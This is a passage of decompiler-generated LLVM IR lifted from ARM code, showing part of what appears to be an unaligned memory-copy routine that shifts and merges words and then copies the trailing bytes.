  %v0_152d4 = phi i32 [ %v0_152d4.pre, %.dec_label_pc_152cc_crit_edge ], [ %v1_15250, %dec_label_pc_15260 ]
  %v0_152d0 = phi i32 [ %v0_152d0.pre, %.dec_label_pc_152cc_crit_edge ], [ %v4_152c8, %dec_label_pc_15260 ]
  %v1_152dc = phi i32 [ %v0_152cc.pre, %.dec_label_pc_152cc_crit_edge ], [ %v2_152c8, %dec_label_pc_15260 ]
  store i32 %v1_152dc, i32* %r4.global-to-local, align 4
  %v1_152d0 = inttoptr i32 %v0_152d0 to i32*
  %v2_152d0 = load i32, i32* %v1_152d0, align 4
  store i32 %v2_152d0, i32* %r5.global-to-local, align 4
  %v3_152d0 = add i32 %v0_152d0, 4
  %v4_152d0 = inttoptr i32 %v3_152d0 to i32*
  %v5_152d0 = load i32, i32* %v4_152d0, align 4
  store i32 %v5_152d0, i32* %r6.global-to-local, align 4
  %v6_152d0 = add i32 %v0_152d0, 8
  %v7_152d0 = inttoptr i32 %v6_152d0 to i32*
  %v8_152d0 = load i32, i32* %v7_152d0, align 4
  store i32 %v8_152d0, i32* %r7.global-to-local, align 4
  %v9_152d0 = add i32 %v0_152d0, 12
  %v10_152d0 = inttoptr i32 %v9_152d0 to i32*
  %v11_152d0 = load i32, i32* %v10_152d0, align 4
  store i32 %v11_152d0, i32* %r8.global-to-local, align 4
  %v12_152d0 = add i32 %v0_152d0, 16
  %v13_152d0 = inttoptr i32 %v12_152d0 to i32*
  %v14_152d0 = load i32, i32* %v13_152d0, align 4
  store i32 %v14_152d0, i32* %sb.global-to-local, align 4
  %v15_152d0 = add i32 %v0_152d0, 20
  %v16_152d0 = inttoptr i32 %v15_152d0 to i32*
  %v17_152d0 = load i32, i32* %v16_152d0, align 4
  store i32 %v17_152d0, i32* %sl.global-to-local, align 4
  %v18_152d0 = add i32 %v0_152d0, 24
  %v19_152d0 = inttoptr i32 %v18_152d0 to i32*
  %v20_152d0 = load i32, i32* %v19_152d0, align 4
  store i32 %v20_152d0, i32* %fp.global-to-local, align 4
  %v21_152d0 = add i32 %v0_152d0, 28
  store i32 %v21_152d0, i32* %r1.global-to-local, align 4
  %v1_152d4 = add i32 %v0_152d4, -32
  store i32 %v1_152d4, i32* %r2.global-to-local, align 4
  %v2_152d4 = icmp ugt i32 %v0_152d4, 31
  br i1 %v2_152d4, label %bb155, label %bb156

bb155:                                            ; preds = %dec_label_pc_152cc
  %v2_152d8 = inttoptr i32 %v21_152d0 to i32*
  %v3_152d8 = load i32, i32* %v2_152d8, align 4
  store i32 %v3_152d8, i32* %ip.global-to-local, align 4
  %v5_152d8 = add i32 %v0_152d0, 32
  store i32 %v5_152d8, i32* %r1.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_152cc, %bb155
  %v0_152dc = load i32, i32* @r3, align 4
  %v4_152dc = mul i32 %v1_152dc, 16777216
  %v5_152dc = or i32 %v0_152dc, %v4_152dc
  %v3_152e0 = udiv i32 %v1_152dc, 256
  %v4_152e4 = mul i32 %v2_152d0, 16777216
  %v5_152e4 = or i32 %v4_152e4, %v3_152e0
  store i32 %v5_152e4, i32* %r4.global-to-local, align 4
  %v3_152e8 = udiv i32 %v2_152d0, 256
  %v4_152ec = mul i32 %v5_152d0, 16777216
  %v5_152ec = or i32 %v4_152ec, %v3_152e8
  store i32 %v5_152ec, i32* %r5.global-to-local, align 4
  %v3_152f0 = udiv i32 %v5_152d0, 256
  %v4_152f4 = mul i32 %v8_152d0, 16777216
  %v5_152f4 = or i32 %v4_152f4, %v3_152f0
  store i32 %v5_152f4, i32* %r6.global-to-local, align 4
  %v3_152f8 = udiv i32 %v8_152d0, 256
  %v4_152fc = mul i32 %v11_152d0, 16777216
  %v5_152fc = or i32 %v4_152fc, %v3_152f8
  store i32 %v5_152fc, i32* %r7.global-to-local, align 4
  %v3_15300 = udiv i32 %v11_152d0, 256
  %v4_15304 = mul i32 %v14_152d0, 16777216
  %v5_15304 = or i32 %v4_15304, %v3_15300
  store i32 %v5_15304, i32* %r8.global-to-local, align 4
  %v3_15308 = udiv i32 %v14_152d0, 256
  %v4_1530c = mul i32 %v17_152d0, 16777216
  %v5_1530c = or i32 %v4_1530c, %v3_15308
  store i32 %v5_1530c, i32* %sb.global-to-local, align 4
  %v3_15310 = udiv i32 %v17_152d0, 256
  %v4_15314 = mul i32 %v20_152d0, 16777216
  %v5_15314 = or i32 %v4_15314, %v3_15310
  store i32 %v5_15314, i32* %sl.global-to-local, align 4
  %v1_15318 = inttoptr i32 %v0_15318 to i32*
  store i32 %v5_152dc, i32* %v1_15318, align 4
  %v3_15318 = add i32 %v0_15318, 4
  %v4_15318 = inttoptr i32 %v3_15318 to i32*
  %v5_15318 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15318, i32* %v4_15318, align 4
  %v6_15318 = add i32 %v0_15318, 8
  %v7_15318 = inttoptr i32 %v6_15318 to i32*
  %v8_15318 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15318, i32* %v7_15318, align 4
  %v9_15318 = add i32 %v0_15318, 12
  %v10_15318 = inttoptr i32 %v9_15318 to i32*
  %v11_15318 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_15318, i32* %v10_15318, align 4
  %v12_15318 = add i32 %v0_15318, 16
  %v13_15318 = inttoptr i32 %v12_15318 to i32*
  %v14_15318 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_15318, i32* %v13_15318, align 4
  %v15_15318 = add i32 %v0_15318, 20
  %v16_15318 = inttoptr i32 %v15_15318 to i32*
  %v17_15318 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_15318, i32* %v16_15318, align 4
  %v18_15318 = add i32 %v0_15318, 24
  %v19_15318 = inttoptr i32 %v18_15318 to i32*
  %v20_15318 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_15318, i32* %v19_15318, align 4
  %v21_15318 = add i32 %v0_15318, 28
  %v22_15318 = inttoptr i32 %v21_15318 to i32*
  %v23_15318 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_15318, i32* %v22_15318, align 4
  %v24_15318 = add i32 %v0_15318, 32
  store i32 %v24_15318, i32* %r0.global-to-local, align 4
  %v0_1531c = load i32, i32* %fp.global-to-local, align 4
  %v1_1531c = and i32 %v0_1531c, 128
  %v2_1531c = icmp eq i32 %v1_1531c, 0
  %v3_1531c = udiv i32 %v0_1531c, 256
  store i32 %v3_1531c, i32* @r3, align 4
  br i1 %v2_1531c, label %dec_label_pc_15384.loopexit18, label %.dec_label_pc_152cc_crit_edge

.dec_label_pc_152cc_crit_edge:                    ; preds = %bb156
  %v0_152cc.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_152d0.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_152d4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_152cc

dec_label_pc_15328:                               ; preds = %dec_label_pc_15258
  %v0_15328 = load i32, i32* %r1.global-to-local, align 4
  %v1_15328 = inttoptr i32 %v0_15328 to i32*
  %v2_15328 = load i32, i32* %v1_15328, align 4
  store i32 %v2_15328, i32* %ip.global-to-local, align 4
  %v4_15328 = add i32 %v0_15328, 4
  store i32 %v4_15328, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1532c

dec_label_pc_1532c:                               ; preds = %.dec_label_pc_1532c_crit_edge, %dec_label_pc_15328
  %v0_15378 = phi i32 [ %v24_15378, %.dec_label_pc_1532c_crit_edge ], [ %v0_152b838, %dec_label_pc_15328 ]
  %v0_15334 = phi i32 [ %v0_15334.pre, %.dec_label_pc_1532c_crit_edge ], [ %v1_15250, %dec_label_pc_15328 ]
  %v0_15330 = phi i32 [ %v0_15330.pre, %.dec_label_pc_1532c_crit_edge ], [ %v4_15328, %dec_label_pc_15328 ]
  %v1_1533c = phi i32 [ %v0_1532c.pre, %.dec_label_pc_1532c_crit_edge ], [ %v2_15328, %dec_label_pc_15328 ]
  store i32 %v1_1533c, i32* %r4.global-to-local, align 4
  %v1_15330 = inttoptr i32 %v0_15330 to i32*
  %v2_15330 = load i32, i32* %v1_15330, align 4
  store i32 %v2_15330, i32* %r5.global-to-local, align 4
  %v3_15330 = add i32 %v0_15330, 4
  %v4_15330 = inttoptr i32 %v3_15330 to i32*
  %v5_15330 = load i32, i32* %v4_15330, align 4
  store i32 %v5_15330, i32* %r6.global-to-local, align 4
  %v6_15330 = add i32 %v0_15330, 8
  %v7_15330 = inttoptr i32 %v6_15330 to i32*
  %v8_15330 = load i32, i32* %v7_15330, align 4
  store i32 %v8_15330, i32* %r7.global-to-local, align 4
  %v9_15330 = add i32 %v0_15330, 12
  %v10_15330 = inttoptr i32 %v9_15330 to i32*
  %v11_15330 = load i32, i32* %v10_15330, align 4
  store i32 %v11_15330, i32* %r8.global-to-local, align 4
  %v12_15330 = add i32 %v0_15330, 16
  %v13_15330 = inttoptr i32 %v12_15330 to i32*
  %v14_15330 = load i32, i32* %v13_15330, align 4
  store i32 %v14_15330, i32* %sb.global-to-local, align 4
  %v15_15330 = add i32 %v0_15330, 20
  %v16_15330 = inttoptr i32 %v15_15330 to i32*
  %v17_15330 = load i32, i32* %v16_15330, align 4
  store i32 %v17_15330, i32* %sl.global-to-local, align 4
  %v18_15330 = add i32 %v0_15330, 24
  %v19_15330 = inttoptr i32 %v18_15330 to i32*
  %v20_15330 = load i32, i32* %v19_15330, align 4
  store i32 %v20_15330, i32* %fp.global-to-local, align 4
  %v21_15330 = add i32 %v0_15330, 28
  store i32 %v21_15330, i32* %r1.global-to-local, align 4
  %v1_15334 = add i32 %v0_15334, -32
  store i32 %v1_15334, i32* %r2.global-to-local, align 4
  %v2_15334 = icmp ugt i32 %v0_15334, 31
  br i1 %v2_15334, label %bb157, label %bb158

bb157:                                            ; preds = %dec_label_pc_1532c
  %v2_15338 = inttoptr i32 %v21_15330 to i32*
  %v3_15338 = load i32, i32* %v2_15338, align 4
  store i32 %v3_15338, i32* %ip.global-to-local, align 4
  %v5_15338 = add i32 %v0_15330, 32
  store i32 %v5_15338, i32* %r1.global-to-local, align 4
  br label %bb158

bb158:                                            ; preds = %dec_label_pc_1532c, %bb157
  %v0_1533c = load i32, i32* @r3, align 4
  %v4_1533c = mul i32 %v1_1533c, 256
  %v5_1533c = or i32 %v0_1533c, %v4_1533c
  %v3_15340 = udiv i32 %v1_1533c, 16777216
  %v4_15344 = mul i32 %v2_15330, 256
  %v5_15344 = or i32 %v4_15344, %v3_15340
  store i32 %v5_15344, i32* %r4.global-to-local, align 4
  %v3_15348 = udiv i32 %v2_15330, 16777216
  %v4_1534c = mul i32 %v5_15330, 256
  %v5_1534c = or i32 %v4_1534c, %v3_15348
  store i32 %v5_1534c, i32* %r5.global-to-local, align 4
  %v3_15350 = udiv i32 %v5_15330, 16777216
  %v4_15354 = mul i32 %v8_15330, 256
  %v5_15354 = or i32 %v4_15354, %v3_15350
  store i32 %v5_15354, i32* %r6.global-to-local, align 4
  %v3_15358 = udiv i32 %v8_15330, 16777216
  %v4_1535c = mul i32 %v11_15330, 256
  %v5_1535c = or i32 %v4_1535c, %v3_15358
  store i32 %v5_1535c, i32* %r7.global-to-local, align 4
  %v3_15360 = udiv i32 %v11_15330, 16777216
  %v4_15364 = mul i32 %v14_15330, 256
  %v5_15364 = or i32 %v4_15364, %v3_15360
  store i32 %v5_15364, i32* %r8.global-to-local, align 4
  %v3_15368 = udiv i32 %v14_15330, 16777216
  %v4_1536c = mul i32 %v17_15330, 256
  %v5_1536c = or i32 %v4_1536c, %v3_15368
  store i32 %v5_1536c, i32* %sb.global-to-local, align 4
  %v3_15370 = udiv i32 %v17_15330, 16777216
  %v4_15374 = mul i32 %v20_15330, 256
  %v5_15374 = or i32 %v4_15374, %v3_15370
  store i32 %v5_15374, i32* %sl.global-to-local, align 4
  %v1_15378 = inttoptr i32 %v0_15378 to i32*
  store i32 %v5_1533c, i32* %v1_15378, align 4
  %v3_15378 = add i32 %v0_15378, 4
  %v4_15378 = inttoptr i32 %v3_15378 to i32*
  %v5_15378 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_15378, i32* %v4_15378, align 4
  %v6_15378 = add i32 %v0_15378, 8
  %v7_15378 = inttoptr i32 %v6_15378 to i32*
  %v8_15378 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_15378, i32* %v7_15378, align 4
  %v9_15378 = add i32 %v0_15378, 12
  %v10_15378 = inttoptr i32 %v9_15378 to i32*
  %v11_15378 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v11_15378, i32* %v10_15378, align 4
  %v12_15378 = add i32 %v0_15378, 16
  %v13_15378 = inttoptr i32 %v12_15378 to i32*
  %v14_15378 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v14_15378, i32* %v13_15378, align 4
  %v15_15378 = add i32 %v0_15378, 20
  %v16_15378 = inttoptr i32 %v15_15378 to i32*
  %v17_15378 = load i32, i32* %r8.global-to-local, align 4
  store i32 %v17_15378, i32* %v16_15378, align 4
  %v18_15378 = add i32 %v0_15378, 24
  %v19_15378 = inttoptr i32 %v18_15378 to i32*
  %v20_15378 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v20_15378, i32* %v19_15378, align 4
  %v21_15378 = add i32 %v0_15378, 28
  %v22_15378 = inttoptr i32 %v21_15378 to i32*
  %v23_15378 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v23_15378, i32* %v22_15378, align 4
  %v24_15378 = add i32 %v0_15378, 32
  store i32 %v24_15378, i32* %r0.global-to-local, align 4
  %v0_1537c = load i32, i32* %fp.global-to-local, align 4
  %v1_1537c = and i32 %v0_1537c, 8388608
  %v2_1537c = icmp eq i32 %v1_1537c, 0
  %v3_1537c = udiv i32 %v0_1537c, 16777216
  store i32 %v3_1537c, i32* @r3, align 4
  br i1 %v2_1537c, label %dec_label_pc_15384.loopexit, label %.dec_label_pc_1532c_crit_edge

.dec_label_pc_1532c_crit_edge:                    ; preds = %bb158
  %v0_1532c.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_15330.pre = load i32, i32* %r1.global-to-local, align 4
  %v0_15334.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1532c

dec_label_pc_15384.loopexit:                      ; preds = %bb158
  %v6_15334.le = icmp slt i32 %v1_15334, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_15334.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15384

dec_label_pc_15384.loopexit18:                    ; preds = %bb156
  %v6_152d4.le = icmp slt i32 %v1_152d4, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_152d4.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15384

dec_label_pc_15384.loopexit19:                    ; preds = %bb154
  %v6_15274.le = icmp slt i32 %v1_15274, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_15274.le, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_15384

dec_label_pc_15384:                               ; preds = %dec_label_pc_15384.loopexit19, %dec_label_pc_15384.loopexit18, %dec_label_pc_15384.loopexit, %dec_label_pc_15250
  %v1_153a450 = phi i32 [ %v24_152b8, %dec_label_pc_15384.loopexit19 ], [ %v24_15318, %dec_label_pc_15384.loopexit18 ], [ %v24_15378, %dec_label_pc_15384.loopexit ], [ %v0_152b838, %dec_label_pc_15250 ]
  %v0_15384 = load i32, i32* %lr.global-to-local, align 4
  %v1_15384 = sub i32 32, %v0_15384
  store i32 %v1_15384, i32* @ip, align 4
  %v0_15388 = load i32, i32* %r2.global-to-local, align 4
  %v1_15388 = add i32 %v0_15388, 32
  store i32 %v1_15388, i32* %r2.global-to-local, align 4
  %v1_1538c = add i32 %v0_15388, 28
  %v2_1538c = icmp ugt i32 %v1_15388, 3
  store i1 %v2_1538c, i1* %cpsr_c.global-to-local, align 1
  %v6_1538c = icmp slt i32 %v1_1538c, 0
  store i1 %v6_1538c, i1* %cpsr_n.global-to-local, align 1
  %v3_15390 = icmp ult i32 %v1_15388, 2
  br i1 %v3_15390, label %dec_label_pc_153b0, label %dec_label_pc_15394

dec_label_pc_15394:                               ; preds = %dec_label_pc_15384, %dec_label_pc_15394.dec_label_pc_15394_crit_edge
  %v1_153a4 = phi i32 [ %v4_153a4, %dec_label_pc_15394.dec_label_pc_15394_crit_edge ], [ %v1_153a450, %dec_label_pc_15384 ]
  %v1_153a0 = phi i32 [ %v1_153a0.pre, %dec_label_pc_15394.dec_label_pc_15394_crit_edge ], [ %v1_15384, %dec_label_pc_15384 ]
  %v2_1539c = phi i32 [ %v2_1539c.pre, %dec_label_pc_15394.dec_label_pc_15394_crit_edge ], [ %v0_15384, %dec_label_pc_15384 ]
  %v0_15398 = phi i32 [ %v0_153a8, %dec_label_pc_15394.dec_label_pc_15394_crit_edge ], [ %v1_15388, %dec_label_pc_15384 ]
  %v0_15394 = load i32, i32* %r1.global-to-local, align 4
  %v1_15394 = inttoptr i32 %v0_15394 to i32*
  %v2_15394 = load i32, i32* %v1_15394, align 4
  store i32 %v2_15394, i32* %r5.global-to-local, align 4
  %v4_15394 = add i32 %v0_15394, 4
  store i32 %v4_15394, i32* %r1.global-to-local, align 4
  %v1_15398 = add i32 %v0_15398, -4
  store i32 %v1_15398, i32* %r2.global-to-local, align 4
  %v0_1539c = load i32, i32* @r3, align 4
  %v7_1539c = shl i32 %v2_15394, %v2_1539c
  %v8_1539c = or i32 %v0_1539c, %v7_1539c
  store i32 %v8_1539c, i32* %r4.global-to-local, align 4
  %v6_153a0 = lshr i32 %v2_15394, %v1_153a0
  store i32 %v6_153a0, i32* @r3, align 4
  %v2_153a4 = inttoptr i32 %v1_153a4 to i32*
  store i32 %v8_1539c, i32* %v2_153a4, align 4
  %v3_153a4 = load i32, i32* %r0.global-to-local, align 4
  %v4_153a4 = add i32 %v3_153a4, 4
  store i32 %v4_153a4, i32* %r0.global-to-local, align 4
  %v0_153a8 = load i32, i32* %r2.global-to-local, align 4
  %v2_153a8 = icmp ugt i32 %v0_153a8, 3
  br i1 %v2_153a8, label %dec_label_pc_15394.dec_label_pc_15394_crit_edge, label %dec_label_pc_153b0.loopexit

dec_label_pc_15394.dec_label_pc_15394_crit_edge:  ; preds = %dec_label_pc_15394
  %v2_1539c.pre = load i32, i32* %lr.global-to-local, align 4
  %v1_153a0.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_15394

dec_label_pc_153b0.loopexit:                      ; preds = %dec_label_pc_15394
  %v1_153a8 = add i32 %v0_153a8, -4
  %v6_153a8 = icmp slt i32 %v1_153a8, 0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 %v6_153a8, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_153b0

dec_label_pc_153b0:                               ; preds = %dec_label_pc_153b0.loopexit, %dec_label_pc_15384, %dec_label_pc_1524c, %.thread10
  %v3_153b4 = phi i32 [ %v4_153a4, %dec_label_pc_153b0.loopexit ], [ %v1_153a450, %dec_label_pc_15384 ], [ %v4_15240, %dec_label_pc_1524c ], [ %v0_1522831, %.thread10 ]
  %v0_153b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_153b0 = and i32 %v0_153b0, 16
  %v2_153b0 = icmp ne i32 %v1_153b0, 0
  store i1 %v2_153b0, i1* %cpsr_c.global-to-local, align 1
  %v3_153b0 = mul i32 %v0_153b0, 268435456
  store i32 %v3_153b0, i32* %r5.global-to-local, align 4
  %v4_153b0 = icmp slt i32 %v3_153b0, 0
  store i1 %v4_153b0, i1* %cpsr_n.global-to-local, align 1
  br i1 %v4_153b0, label %bb159, label %thread-pre-split12

bb159:                                            ; preds = %dec_label_pc_153b0
  %v1_153b4 = load i32, i32* @r3, align 4
  %v2_153b4 = trunc i32 %v1_153b4 to i8
  %v4_153b4 = inttoptr i32 %v3_153b4 to i8*
  store i8 %v2_153b4, i8* %v4_153b4, align 1
  %v5_153b4 = load i32, i32* %r0.global-to-local, align 4
  %v6_153b4 = add i32 %v5_153b4, 1
  store i32 %v6_153b4, i32* %r0.global-to-local, align 4
  %v0_153b8.pr = load i1, i1* %cpsr_n.global-to-local, align 1
  br i1 %v0_153b8.pr, label %bb160, label %.thread-pre-split12_crit_edge

.thread-pre-split12_crit_edge:                    ; preds = %bb159
  %v0_153bc.pr.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153bc.pr.pre, label %thread-pre-split12._crit_edge, label %.thread15

thread-pre-split12:                               ; preds = %dec_label_pc_153b0
  br i1 %v2_153b0, label %thread-pre-split12._crit_edge, label %.thread15

thread-pre-split12._crit_edge:                    ; preds = %.thread-pre-split12_crit_edge, %thread-pre-split12
  %v3_153bc56115 = phi i32 [ %v6_153b4, %.thread-pre-split12_crit_edge ], [ %v3_153b4, %thread-pre-split12 ]
  %v1_153bc.pre = load i32, i32* @r3, align 4
  %extract.t84 = trunc i32 %v1_153bc.pre to i8
  br label %bb161

bb160:                                            ; preds = %bb159
  %v1_153b8 = load i32, i32* @r3, align 4
  %v2_153b8 = and i32 %v1_153b8, 128
  %v3_153b8 = icmp ne i32 %v2_153b8, 0
  store i1 %v3_153b8, i1* %cpsr_c.global-to-local, align 1
  %v4_153b8 = udiv i32 %v1_153b8, 256
  store i32 %v4_153b8, i32* @r3, align 4
  %extract.t85 = trunc i32 %v4_153b8 to i8
  br i1 %v3_153b8, label %bb161, label %.thread15

bb161:                                            ; preds = %thread-pre-split12._crit_edge, %bb160
  %v3_153bc = phi i32 [ %v3_153bc56115, %thread-pre-split12._crit_edge ], [ %v6_153b4, %bb160 ]
  %v1_153bc.off0 = phi i8 [ %extract.t84, %thread-pre-split12._crit_edge ], [ %extract.t85, %bb160 ]
  %v4_153bc = inttoptr i32 %v3_153bc to i8*
  store i8 %v1_153bc.off0, i8* %v4_153bc, align 1
  %v5_153bc = load i32, i32* %r0.global-to-local, align 4
  %v6_153bc = add i32 %v5_153bc, 1
  store i32 %v6_153bc, i32* %r0.global-to-local, align 4
  %v0_153c0.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153c0.pr, label %bb162, label %.thread15

bb162:                                            ; preds = %bb161
  %v1_153c0 = load i32, i32* @r3, align 4
  %v2_153c0 = and i32 %v1_153c0, 128
  %v3_153c0 = icmp ne i32 %v2_153c0, 0
  store i1 %v3_153c0, i1* %cpsr_c.global-to-local, align 1
  %v4_153c0 = udiv i32 %v1_153c0, 256
  store i32 %v4_153c0, i32* @r3, align 4
  br i1 %v3_153c0, label %bb163, label %.thread15

bb163:                                            ; preds = %bb162
  %v2_153c4 = trunc i32 %v4_153c0 to i8
  %v4_153c4 = inttoptr i32 %v6_153bc to i8*
  store i8 %v2_153c4, i8* %v4_153c4, align 1
  %v5_153c4 = load i32, i32* %r0.global-to-local, align 4
  %v6_153c4 = add i32 %v5_153c4, 1
  store i32 %v6_153c4, i32* %r0.global-to-local, align 4
  br label %.thread15

.thread15:                                        ; preds = %.thread-pre-split12_crit_edge, %bb160, %thread-pre-split12, %bb161, %bb162, %bb163
  %v3_153dc78 = phi i32 [ %v6_153b4, %bb160 ], [ %v3_153b4, %thread-pre-split12 ], [ %v6_153bc, %bb161 ], [ %v6_153bc, %bb162 ], [ %v6_153c4, %bb163 ], [ %v6_153b4, %.thread-pre-split12_crit_edge ]
  %v2_153c8 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_153c8, i32* @r5, align 4
  store i32 %v5_151e8, i32* @r6, align 4
  store i32 %v8_151e8, i32* @r7, align 4
  store i32 %v11_151e8, i32* @r8, align 4
  store i32 %v14_151e8, i32* @sb, align 4
  store i32 %v17_151e8, i32* @sl, align 4
  store i32 %v20_151e8, i32* @fp, align 4
  %v0_153cc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_153cc

dec_label_pc_153cc:                               ; preds = %dec_label_pc_151e0, %dec_label_pc_150f0, %.thread15
  %v3_153dc = phi i32 [ %v1_1515c, %dec_label_pc_151e0 ], [ %v3_150f0, %dec_label_pc_150f0 ], [ %v3_153dc78, %.thread15 ]
  %v0_153cc = phi i32 [ %v0_151e0, %dec_label_pc_151e0 ], [ %v0_150f8, %dec_label_pc_150f0 ], [ %v0_153cc.pre, %.thread15 ]
  %v1_153cc = and i32 %v0_153cc, 2
  %v2_153cc = icmp ne i32 %v1_153cc, 0
  store i1 %v2_153cc, i1* %cpsr_c.global-to-local, align 1
  %v3_153cc = shl i32 %v0_153cc, 31
  store i32 %v3_153cc, i32* @r2, align 4
  %v4_153cc = icmp ne i32 %v3_153cc, 0
  store i1 %v4_153cc, i1* %cpsr_n.global-to-local, align 1
  br i1 %v4_153cc, label %bb164, label %bb165

bb164:                                            ; preds = %dec_label_pc_153cc
  %v1_153d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_153d0 = inttoptr i32 %v1_153d0 to i8*
  %v3_153d0 = load i8, i8* %v2_153d0, align 1
  %v4_153d0 = zext i8 %v3_153d0 to i32
  store i32 %v4_153d0, i32* @r2, align 4
  %v6_153d0 = add i32 %v1_153d0, 1
  store i32 %v6_153d0, i32* %r1.global-to-local, align 4
  br label %bb165

bb165:                                            ; preds = %dec_label_pc_153cc, %bb164
  %v1_153dc.off0 = phi i8 [ 0, %dec_label_pc_153cc ], [ %v3_153d0, %bb164 ]
  br i1 %v2_153cc, label %bb166, label %.thread16

bb166:                                            ; preds = %bb165
  %v1_153d4 = load i32, i32* %r1.global-to-local, align 4
  %v2_153d4 = inttoptr i32 %v1_153d4 to i8*
  %v3_153d4 = load i8, i8* %v2_153d4, align 1
  %v4_153d4 = zext i8 %v3_153d4 to i32
  store i32 %v4_153d4, i32* @r3, align 4
  %v6_153d4 = add i32 %v1_153d4, 1
  store i32 %v6_153d4, i32* %r1.global-to-local, align 4
  %v2_153d8 = inttoptr i32 %v6_153d4 to i8*
  %v3_153d8 = load i8, i8* %v2_153d8, align 1
  %v4_153d8 = zext i8 %v3_153d8 to i32
  store i32 %v4_153d8, i32* @ip, align 4
  br label %.thread16

.thread16:                                        ; preds = %bb165, %bb166
  br i1 %v4_153cc, label %bb167, label %bb168

bb167:                                            ; preds = %.thread16
  %v4_153dc = inttoptr i32 %v3_153dc to i8*
  store i8 %v1_153dc.off0, i8* %v4_153dc, align 1
  %v5_153dc = load i32, i32* %r0.global-to-local, align 4
  %v6_153dc = add i32 %v5_153dc, 1
  store i32 %v6_153dc, i32* %r0.global-to-local, align 4
  %v0_153e0.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153e0.pre, label %bb169, label %.thread17

bb168:                                            ; preds = %.thread16
  br i1 %v2_153cc, label %bb169, label %.thread17

bb169:                                            ; preds = %bb167, %bb168
  %v3_153e0116 = phi i32 [ %v6_153dc, %bb167 ], [ %v3_153dc, %bb168 ]
  %v1_153e0 = load i32, i32* @r3, align 4
  %v2_153e0 = trunc i32 %v1_153e0 to i8
  %v4_153e0 = inttoptr i32 %v3_153e0116 to i8*
  store i8 %v2_153e0, i8* %v4_153e0, align 1
  %v5_153e0 = load i32, i32* %r0.global-to-local, align 4
  %v6_153e0 = add i32 %v5_153e0, 1
  store i32 %v6_153e0, i32* %r0.global-to-local, align 4
  %v0_153e4.pr = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_153e4.pr, label %bb170, label %.thread17

bb170:                                            ; preds = %bb169
  %v1_153e4 = load i32, i32* @ip, align 4
  %v2_153e4 = trunc i32 %v1_153e4 to i8
  %v4_153e4 = inttoptr i32 %v6_153e0 to i8*
  store i8 %v2_153e4, i8* %v4_153e4, align 1
  br label %.thread17

.thread17:                                        ; preds = %bb167, %bb168, %bb169, %bb170
  store i32 %v3_150f0, i32* %r0.global-to-local, align 4
  store i32 %v8_150f0, i32* @r4, align 4
  store i32 %v11_150f0, i32* @lr, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  ret i32 %v3_150f0

; uselistorder directives
  uselistorder i32 %v4_153c0, { 1, 0 }
  uselistorder i32 %v4_153b8, { 1, 0 }
  uselistorder i32 %v6_153b4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v3_153b0, { 1, 0 }
  uselistorder i32 %v0_153a8, { 0, 2, 1 }
  uselistorder i32 %v4_153a4, { 0, 2, 1 }
  uselistorder i32 %v2_15394, { 1, 0, 2 }
  uselistorder i32 %v1_153a450, { 1, 0 }
  uselistorder i32 %v24_15378, { 0, 2, 1 }
  uselistorder i32 %v17_15330, { 1, 0, 2 }
  uselistorder i32 %v14_15330, { 1, 0, 2 }
  uselistorder i32 %v11_15330, { 1, 0, 2 }
  uselistorder i32 %v8_15330, { 1, 0, 2 }
  uselistorder i32 %v5_15330, { 1, 0, 2 }
  uselistorder i32 %v2_15330, { 1, 0, 2 }
  uselistorder i32 %v1_1533c, { 1, 0, 2 }
  uselistorder i32 %v0_15330, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_15334, { 1, 0 }
  uselistorder i32 %v0_15378, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v24_15318, { 0, 2, 1 }
  uselistorder i32 %v17_152d0, { 1, 0, 2 }
  uselistorder i32 %v14_152d0, { 1, 0, 2 }
  uselistorder i32 %v11_152d0, { 1, 0, 2 }
  uselistorder i32 %v8_152d0, { 1, 0, 2 }
  uselistorder i32 %v5_152d0, { 1, 0, 2 }
  uselistorder i32 %v2_152d0, { 1, 0, 2 }
  uselistorder i32 %v1_152dc, { 1, 0, 2 }
  uselistorder i32 %v0_152d0, { 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 %v0_152d4, { 1, 0 }
